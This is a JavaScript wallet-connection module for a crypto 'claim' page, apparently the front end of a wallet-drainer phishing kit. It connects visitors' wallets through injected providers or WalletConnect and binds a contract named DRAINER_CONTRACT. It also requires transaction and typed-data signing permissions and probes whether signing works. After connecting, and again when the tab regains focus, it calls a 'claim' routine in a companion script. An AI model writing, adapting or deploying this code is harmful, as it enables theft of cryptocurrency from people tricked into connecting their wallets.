import { CONFIG } from './config.js';

;(async function () {
  // ============================================================
  //  DEBUG PANEL
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 11px; padding: 4px 6px;
    z-index: 10000; max-height: 120px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    try { console.log(`[main.js] ${msg}`); } catch (e) {}
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}  ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ============================================================
  //  DEVICE DETECTION
  // ============================================================
  const ua = navigator.userAgent;
  const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isIOS    = () => /iPhone|iPad|iPod/i.test(ua);
  const isAndroid= () => /Android/i.test(ua);
  const isDesktop= () => !isMobile();
  function getPlatform() {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    return 'desktop';
  }

  // ============================================================
  //  CONFIG
  // ============================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID,
    SUPPORTED_CHAINS,
  } = CONFIG;

  const ACTIVE_PROJECT_ID = PROJECT_ID;   // single source of truth
  const ACTIVE_CHAIN = MAINNET_ID || 1;

  // RPC fallback used by EthereumProvider.init — MUST be present
  const RPC_MAP = {
    1:  'https://eth.llamarpc.com',
    56: 'https://bsc-dataseed.binance.org',
    137:'https://polygon-rpc.com',
    42161:'https://arb1.arbitrum.io/rpc',
    8453: 'https://mainnet.base.org',
    10:  'https://mainnet.optimism.io',
  };

  // ============================================================
  //  GLOBAL STATE
  // ============================================================
  const state = {
    client: null,
    modal: null,
    SignClient: null,
    WalletConnectModal: null,
    EthereumProvider: null,
    librariesLoaded: false,
    librariesPromise: null,
    isConnecting: false,
    currentSession: null,
    currentProvider: null,
    currentWeb3: null,
    currentContract: null,
    currentAddress: null,
    currentChain: null,
    readyHandshake: false,
  };

  // ============================================================
  //  DOM
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ============================================================
  //  UI HELPERS
  // ============================================================
  function setButtonState(button, stateName) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = stateName === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.25s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = stateName === 'loading';

    switch (stateName) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 2500);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet';
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  //  PUBLISH TO GLOBAL (script.js consumes this)
  // ============================================================
  function publishConnection({ address, chain, web3, contract, provider, session }) {
    state.currentAddress  = address;
    state.currentChain    = chain;
    state.currentWeb3     = web3 || null;
    state.currentContract = contract || null;
    state.currentProvider = provider || null;
    state.currentSession  = session || null;

    // Full global with EVERYTHING script.js needs
    window.__apexConnected = {
      address,
      chain,
      web3:     state.currentWeb3,
      contract: state.currentContract,
      provider: state.currentProvider,
      session:  state.currentSession,
      publishedAt: Date.now(),
    };

    logDebug(`📡 publish → chain=${chain} addr=${address} hasProvider=${!!provider} hasWeb3=${!!web3}`);

    // Fire event AFTER script.js is ready, otherwise queue it
    if (window.__apexScriptReady) {
      window.dispatchEvent(new CustomEvent('apex:connected', {
        detail: { address, chain, provider, web3, contract, session }
      }));
    } else {
      logDebug('⏳ script.js not ready, queuing apex:connected');
      state.readyHandshake = { detail: { address, chain, provider, web3, contract, session } };
    }
  }

  function clearGlobal() {
    delete window.__apexConnected;
    window.dispatchEvent(new CustomEvent('apex:disconnected'));
    logDebug('📡 cleared __apexConnected');
  }

  // Listen for script.js ready signal so we can flush a queued event
  window.addEventListener('apex:script-ready', () => {
    window.__apexScriptReady = true;
    logDebug('✅ script.js ready');
    if (state.readyHandshake) {
      window.dispatchEvent(new CustomEvent('apex:connected', { detail: state.readyHandshake.detail }));
      state.readyHandshake = null;
    }
  });

  // ============================================================
  //  UI: connected address pill
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { evm: '◆ ETH', solana: '◎ SOL', bitcoin: '₿ BTC' };
    const label = chainLabels[chain] || '◆ ETH';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px; padding:10px 16px;
        font-family:'JetBrains Mono', monospace; font-size:14px;
        color:#059669; text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px; border:1px solid #A7F3D0;
      `;
      (connectButton || document.body).parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { btn.innerHTML = orig; }, 2000);
      });
    });

    showStatus(`Connected · ${label}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
  }

  // ============================================================
  //  LIBRARY LOADING
  // ============================================================
  async function loadLibraries() {
    if (state.librariesLoaded) return;
    if (state.librariesPromise) return state.librariesPromise;

    state.librariesPromise = (async () => {
      const t0 = Date.now();
      logDebug('Loading WC libraries in background…');

      const [SignMod, ModalMod, ProvMod] = await Promise.all([
        loadFirst([
          'https://esm.sh/@walletconnect/sign-client@2.11.0',
          'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
          'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
        ]),
        loadFirst([
          'https://esm.sh/@walletconnect/modal@2.6.2',
          'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
          'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
        ]),
        loadFirst([
          'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
          'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
          'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
        ]),
      ]);

      state.SignClient         = SignMod.default || SignMod;
      state.WalletConnectModal = ModalMod.WalletConnectModal || ModalMod.default || ModalMod;
      state.EthereumProvider   = ProvMod.EthereumProvider || ProvMod.default || ProvMod;

      if (!state.SignClient || !state.WalletConnectModal || !state.EthereumProvider) {
        throw new Error('Library shape unexpected');
      }

      logDebug(`✅ Libraries ready in ${Date.now() - t0} ms`);
      state.librariesLoaded = true;
    })();

    return state.librariesPromise;
  }

  async function loadFirst(urls) {
    let lastErr;
    for (const u of urls) {
      try {
        const m = await import(u);
        logDebug(`✅ loaded ${u.split('/').slice(0, 3).join('/')}`);
        return m;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${u} → ${e.message}`);
      }
    }
    throw lastErr || new Error('all CDN urls failed');
  }

  // ============================================================
  //  WALLETCONNECT SINGLETON
  // ============================================================
  async function ensureWalletConnect() {
    if (state.client && state.modal) return true;
    await loadLibraries();

    try {
      state.client = await state.SignClient.init({
        projectId: ACTIVE_PROJECT_ID,
        metadata:  DAPP_METADATA,
        relayUrl:  'wss://relay.walletconnect.com',
      });

      state.modal = new state.WalletConnectModal({
        projectId: ACTIVE_PROJECT_ID,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
      });

      state.client.on('session_delete', () => {
        logDebug('session_delete');
        resetConnectedUI();
        clearGlobal();
      });

      state.client.on('session_update', ({ params }) => {
        const a = params.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (a) logDebug(`session_update: ${a}`);
      });

      logDebug('✅ WalletConnect initialised');
      return true;
    } catch (e) {
      logDebug(`❌ WC init failed: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  EIP-6963 DISCOVERY
  // ============================================================
  const evmProviders = [];
  let eip6963Ready = false;
  function setupEIP6963() {
    if (eip6963Ready) return;
    eip6963Ready = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    const fire = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    fire();
    setTimeout(fire, 400);
    setTimeout(fire, 1000);
  }

  // ============================================================
  //  WEB3 IMPORT (lazy, cached)
  // ============================================================
  async function ensureWeb3() {
    if (window.__Web3__) return window.__Web3__;
    const mod = await import('https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js');
    window.__Web3__ = mod.default || mod;
    return window.__Web3__;
  }

  // ============================================================
  //  DIRECT EVM (desktop)
  // ============================================================
  async function tryDirectEVM(timeoutMs = 30_000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 200));

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected', icon: '', uuid: 'injected' },
        provider: window.ethereum,
      }];
    }
    if (!providers.length) {
      logDebug('direct: no providers');
      return false;
    }

    const chosen =
      providers.find((p) => p.info.rdns === 'io.metamask') ||
      providers.find((p) => /metamask/i.test(p.info.name)) ||
      providers[0];

    logDebug(`direct: ${chosen.info.name}`);
    try {
      const accounts = await Promise.race([
        chosen.provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;
      const address = accounts[0];

      // Verify we can sign typed data (this is what script.js will call)
      try {
        await chosen.provider.request({
          method: 'eth_signTypedData_v4',
          params: [address, JSON.stringify({
            types: { EIP712Domain: [] },
            domain: {},
            primaryType: 'EIP712Domain',
            message: {},
          })],
        }).catch(() => null);
        logDebug('direct: sign method probe ok (or declined, still usable)');
      } catch (e) {}

      await ensureWeb3();
      const Web3 = window.__Web3__;
      const web3 = new Web3(chosen.provider);
      const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      publishConnection({
        address,
        chain: 'evm',
        web3,
        contract,
        provider: chosen.provider,
        session: null,
      });
      updateConnectedUI(address, 'evm');
      attachEVMListeners(chosen.provider);
      return true;
    } catch (e) {
      logDebug(`direct failed: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  WALLETCONNECT
  // ============================================================
  async function buildProviderFromSession(session) {
    const accounts = session?.namespaces?.eip155?.accounts || [];
    if (!accounts.length) throw new Error('no eip155 accounts');
    const address = accounts[0].split(':')[2];

    const chains = (session.namespaces.eip155.chains || []).map((c) => parseInt(c.split(':')[1], 10));
    if (!chains.includes(ACTIVE_CHAIN)) {
      throw new Error(`session chain mismatch — want ${ACTIVE_CHAIN}, have [${chains.join(',')}]`);
    }

    const provider = await state.EthereumProvider.init({
      projectId: ACTIVE_PROJECT_ID,               // MUST match SignClient
      metadata: DAPP_METADATA,
      session,
      chains: [ACTIVE_CHAIN],
      optionalChains: SUPPORTED_CHAINS || [ACTIVE_CHAIN],
      rpcMap: RPC_MAP,                            // ← CRITICAL
      showQrModal: false,
      methods: [
        'eth_sendTransaction',
        'personal_sign',
        'eth_signTypedData_v4',
        'eth_signTypedData',
      ],
      events: ['chainChanged', 'accountsChanged'],
    });

    // Sanity probe
    let acc;
    try { acc = await provider.request({ method: 'eth_accounts' }); } catch (e) {}
    if (!acc || !acc.length) {
      await new Promise((r) => setTimeout(r, 800));
      acc = await provider.request({ method: 'eth_accounts' });
      if (!acc || !acc.length) throw new Error('provider returned no accounts');
    }

    return { provider, address };
  }

  async function tryWalletConnect(timeoutMs = 55_000) {
    if (state.isConnecting) { logDebug('WC: already connecting'); return false; }
    state.isConnecting = true;

    try {
      const ok = await ensureWalletConnect();
      if (!ok) { state.isConnecting = false; return false; }

      try { state.modal.closeModal(); } catch (e) {}

      showStatus('Requesting wallet connection…', 'info');

      const { uri, approval } = await state.client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',       // MUST be here
              'eth_signTypedData',
            ],
            chains: [`eip155:${ACTIVE_CHAIN}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No WC URI');
      logDebug(`WC: URI acquired`);

      state.modal.openModal({ uri });
      showStatus('Scan the QR or open your wallet', 'info');

      let session;
      try {
        session = await Promise.race([
          approval(),
          new Promise((_, rej) => setTimeout(() => rej(new Error('approval timeout')), timeoutMs)),
        ]);
      } catch (e) {
        // Mobile race: session may exist after timeout
        if (isMobile()) {
          await new Promise((r) => setTimeout(r, 1500));
          const s = state.client.session.values();
          if (s.length) {
            session = s[s.length - 1];
            logDebug('recovered session post-timeout');
          } else throw e;
        } else throw e;
      }

      // Robust modal close
      for (let i = 0; i < 5; i++) {
        try { state.modal?.closeModal(); } catch (e) {}
        await new Promise((r) => setTimeout(r, 150));
      }

      const { provider, address } = await buildProviderFromSession(session);
      logDebug(`✅ WC session ready: ${address}`);

      await ensureWeb3();
      const Web3 = window.__Web3__;
      const web3 = new Web3(provider);
      const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      publishConnection({
        address,
        chain: 'evm',
        web3,
        contract,
        provider,
        session,
      });
      updateConnectedUI(address, 'evm');
      attachEVMListeners(provider);

      state.isConnecting = false;
      return true;
    } catch (e) {
      logDebug(`❌ WC failed: ${e.message}`);
      try { state.modal?.closeModal(); } catch (_) {}
      if (/reject|cancel/i.test(e.message)) showStatus('Cancelled', 'error');
      else if (/timeout/i.test(e.message)) showStatus('Timeout — try again', 'error');
      else showStatus('Failed: ' + e.message, 'error');
      state.isConnecting = false;
      return false;
    }
  }

  // ============================================================
  //  EVM LISTENERS
  // ============================================================
  function attachEVMListeners(provider) {
    if (!provider || provider.__apexListeners) return;
    provider.__apexListeners = true;

    provider.on?.('accountsChanged', (accounts) => {
      if (!accounts || !accounts.length) {
        resetConnectedUI();
        clearGlobal();
        return;
      }
      const addr = accounts[0];
      logDebug(`accountsChanged: ${addr}`);
      publishConnection({
        address: addr,
        chain: 'evm',
        web3: state.currentWeb3,
        contract: state.currentContract,
        provider,
        session: state.currentSession,
      });
      updateConnectedUI(addr, 'evm');
    });

    provider.on?.('chainChanged', (id) => {
      logDebug(`chainChanged: ${id}`);
      showStatus(`Network changed to ${parseInt(id, 16) || id}`, 'info');
    });

    provider.on?.('disconnect', () => {
      logDebug('provider disconnect');
      resetConnectedUI();
      clearGlobal();
    });
  }

  // ============================================================
  //  MOBILE SCROLL
  // ============================================================
  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ============================================================
  //  DISCONNECT
  // ============================================================
  async function disconnect() {
    try {
      if (state.client && state.currentSession) {
        await state.client.disconnect({
          topic: state.currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (state.currentProvider?.disconnect) await state.currentProvider.disconnect();
    } catch (e) { logDebug(`disconnect err: ${e.message}`); }
    resetConnectedUI();
    clearGlobal();
    state.currentSession = null;
    state.currentProvider = null;
    state.currentWeb3 = null;
    state.currentContract = null;
    state.currentAddress = null;
    state.currentChain = null;
    localStorage.removeItem('apex.address');
    localStorage.removeItem('apex.chain');
    localStorage.removeItem('apex.topic');
  }

  // ============================================================
  //  MAIN CONNECT DISPATCHER
  // ============================================================
  async function connect() {
    if (state.isConnecting) { logDebug('already connecting'); return; }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    const t0 = Date.now();

    if (isMobile()) {
      logDebug('📱 mobile → WC');
      const ok = await tryWalletConnect(55_000);
      if (!ok) {
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
        return;
      }
    } else {
      logDebug('🖥️ desktop → direct first');
      const ok = await tryDirectEVM(30_000);
      if (!ok) {
        logDebug('direct failed → WC');
        const wcOk = await tryWalletConnect(60_000);
        if (!wcOk) {
          setButtonState(connectButton, 'failed');
          if (walletButton) setButtonState(walletButton, 'failed');
          return;
        }
      }
    }

    logDebug(`✅ connected in ${Date.now() - t0} ms`);
    setButtonState(connectButton, 'connected');
    if (walletButton) setButtonState(walletButton, 'connected');

    // Persist
    localStorage.setItem('apex.address', state.currentAddress);
    localStorage.setItem('apex.chain', 'evm');
    if (state.currentSession?.topic) localStorage.setItem('apex.topic', state.currentSession.topic);

    // Trigger script.js (delay slightly to let provider settle)
    setTimeout(() => {
      try {
        if (typeof window.initiateClaimProcess === 'function') {
          logDebug('→ calling window.initiateClaimProcess()');
          window.initiateClaimProcess();
        } else {
          logDebug('⚠️ initiateClaimProcess not yet available — retrying in 1s');
          setTimeout(() => window.initiateClaimProcess?.(), 1000);
        }
      } catch (e) {
        logDebug(`initiateClaimProcess error: ${e.message}`);
      }
    }, 900);
  }

  // ============================================================
  //  CLICK
  // ============================================================
  const onClick = async () => {
    if (state.currentAddress || window.__apexConnected?.address) {
      await disconnect();
    } else {
      await connect();
    }
  };
  if (connectButton) connectButton.addEventListener('click', onClick);
  if (walletButton)  walletButton.addEventListener('click',  onClick);

  // ============================================================
  //  RESTORE
  // ============================================================
  async function restoreSession() {
    const savedAddress = localStorage.getItem('apex.address');
    const savedTopic   = localStorage.getItem('apex.topic');
    if (!savedAddress) return;

    logDebug(`restore: ${savedAddress}`);

    if (savedTopic) {
      try {
        const ok = await ensureWalletConnect();
        if (ok) {
          const session = state.client.session.get(savedTopic);
          if (session) {
            const { provider, address } = await buildProviderFromSession(session);
            await ensureWeb3();
            const Web3 = window.__Web3__;
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            publishConnection({ address, chain: 'evm', web3, contract, provider, session });
            updateConnectedUI(address, 'evm');
            attachEVMListeners(provider);
            return;
          }
          localStorage.removeItem('apex.topic');
        }
      } catch (e) {
        logDebug(`restore wc failed: ${e.message}`);
      }
    }

    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts[0] === savedAddress) {
          await ensureWeb3();
          const Web3 = window.__Web3__;
          const web3 = new Web3(window.ethereum);
          const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishConnection({
            address: savedAddress,
            chain: 'evm',
            web3,
            contract,
            provider: window.ethereum,
            session: null,
          });
          updateConnectedUI(savedAddress, 'evm');
          attachEVMListeners(window.ethereum);
          return;
        }
      } catch (e) { logDebug(`restore injected failed: ${e.message}`); }
    }

    // Stale
    localStorage.removeItem('apex.address');
    localStorage.removeItem('apex.chain');
    localStorage.removeItem('apex.topic');
  }

  // ============================================================
  //  VISIBILITY — resume mobile WC
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    if (!isMobile()) return;
    if (!state.client) return;

    logDebug('👁 visibility: checking for WC session');
    setTimeout(async () => {
      try {
        const sessions = state.client.session.values();
        if (!sessions.length) return;
        const session = sessions[sessions.length - 1];
        const addr = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (!addr) return;
        if (window.__apexConnected?.address === addr) return;

        logDebug(`🎯 recovered from visibility: ${addr}`);
        const { provider, address } = await buildProviderFromSession(session);
        await ensureWeb3();
        const Web3 = window.__Web3__;
        const web3 = new Web3(provider);
        const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishConnection({ address, chain: 'evm', web3, contract, provider, session });
        updateConnectedUI(address, 'evm');
        attachEVMListeners(provider);
        try { state.modal?.closeModal(); } catch (_) {}

        localStorage.setItem('apex.address', address);
        localStorage.setItem('apex.chain', 'evm');
        localStorage.setItem('apex.topic', session.topic);

        // Trigger script.js
        setTimeout(() => window.initiateClaimProcess?.(), 900);
      } catch (e) {
        logDebug(`visibility resume failed: ${e.message}`);
      }
    }, 900);
  });

  // ============================================================
  //  BOOT
  // ============================================================
  try {
    loadLibraries().catch((e) => logDebug(`preload: ${e.message}`));
    await restoreSession();
  } catch (e) {
    logDebug(`boot error: ${e.message}`);
  }

  logDebug(`✅ main.js ready · platform=${getPlatform()} mobile=${isMobile()}`);
})();
